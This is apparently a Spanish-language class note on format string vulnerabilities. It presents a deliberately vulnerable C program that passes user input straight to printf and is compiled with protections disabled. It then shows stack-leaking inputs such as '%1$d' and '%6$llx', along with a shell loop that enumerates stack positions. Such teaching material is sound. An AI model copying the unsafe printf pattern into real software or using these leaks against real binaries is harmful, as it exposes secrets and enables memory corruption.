# Clase 6: Format String Vulnerability

#FormatString #FormatStringVulnerability #Printf #InformationLeak #StackLeak #ExploitDevelopment #BinaryExploitation #GDB #x64Assembly #ArbitraryWrite #MemoryLeak #Checksec

---

## Código Vulnerable

Armamos el siguiente código con un flag y un `printf` que deja entrada cruda al usuario:

```c
#include <stdio.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

void read_flag(char* flag) {
    int archivo = open("./flag.txt", O_RDONLY);
    read(archivo, flag, 32);
    close(archivo);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    char buf[256];
    char flag[32];
    
    read_flag(flag);
    
    fgets(buf, 255, stdin);
    printf(buf);
}
```

---

## Compilación

```bash
gcc -g main.c -o main -fno-stack-protector -z execstack -no-pie -Wl,-z,norelro
```

---

## ¿Qué es Format String?

Cuando un binario nos da un `printf` crudo sin formatos, nosotros podríamos dar un `%d`. Al poner esto, aunque no tengamos en este caso un decimal en el programa, nos likea algo. Este algo lo agarra de algún valor en el stack, etc.

---

## Leak con Posiciones Específicas

Supongamos no tenemos un buffer muy grande, entonces podemos ir listando las cosas que nos puede retornar el programa de esta manera:

```bash
./main       
%1$d
174335025
```

Y así nos la podemos llevar likeando cosas del stack.

---

## Automatización con For Loop

Podríamos sacar varios con un `for` simple:

```bash
for num in $(seq 1 10); do echo "%$num\$d" | ./main; done
174335025
-72540024
174335027
583238309
0
812296960
0
-40147536
814059520
60713808
```

---

## Usando %x para Hexadecimal

Aunque lo mejor es con `%x` ya que así nos imprime el número en hexadecimal, solo que nos imprime solo 4 bytes, entonces usamos `%llx`:

```bash
%6$llx
./main                                               
%6$llx
7ffd37900260
```

Y así likeamos. Como es binario de 64 bits, comprobado con:

```bash
checksec main
 Arch:       amd64-64-little
```

Pues son de 8 bytes los registros.

---

## Introducción a Formatos Avanzados

Esta es una introducción pues hay demasiados formatos que nos permiten hacer cosas interesantes. Por ejemplo, hay uno que nos deja poner lo que queramos en una dirección donde queramos, lo cual es **oro puro**.

---

## Notas Importantes

- `%d` - Imprime enteros decimales
- `%x` - Imprime en hexadecimal (4 bytes)
- `%llx` - Imprime en hexadecimal (8 bytes, para x64)
- `%n$format` - Accede a la n-ésima posición en el stack
- Format string permite leak de información del stack
- Con ciertos formatos se puede escribir en memoria arbitrariamente